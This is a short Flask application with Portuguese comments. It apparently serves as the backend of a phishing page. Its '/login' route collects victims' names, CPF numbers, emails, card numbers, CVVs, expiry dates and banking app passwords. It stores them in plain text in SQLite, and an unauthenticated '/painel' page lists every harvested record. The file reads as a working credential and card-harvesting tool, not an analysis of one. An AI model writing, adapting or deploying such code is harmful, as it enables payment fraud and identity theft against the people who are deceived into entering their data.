import os
import sqlite3
from flask import Flask, render_template, request, redirect, url_for, g

app = Flask(__name__)
# Nome do banco novo para limpar qualquer trava anterior
DATABASE = 'data_final_v99.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.execute('''CREATE TABLE IF NOT EXISTS clientes 
            (id INTEGER PRIMARY KEY AUTOINCREMENT, 
             nome TEXT, cpf TEXT, email TEXT, 
             num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
        db.commit()

@app.route('/')
def index():
    init_db()
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        nome = request.form.get('nome')
        cpf = request.form.get('cpf')
        email = request.form.get('email')
        cartao = request.form.get('num_cartao')
        senha = request.form.get('senha_app')
        cvv = request.form.get('cvv')
        validade = request.form.get('validade')
        
        db = get_db()
        db.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
                      VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
        db.commit()
    except Exception as e:
        print(f"Erro: {e}")
    return redirect(url_for('sucesso'))

@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')

@app.route('/painel')
def admin():
    init_db()
    try:
        db = get_db()
        usuarios = db.execute('SELECT * FROM clientes ORDER BY id DESC').fetchall()
        return render_template('admin.html', usuarios=usuarios)
    except:
        return render_template('admin.html', usuarios=[])

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)






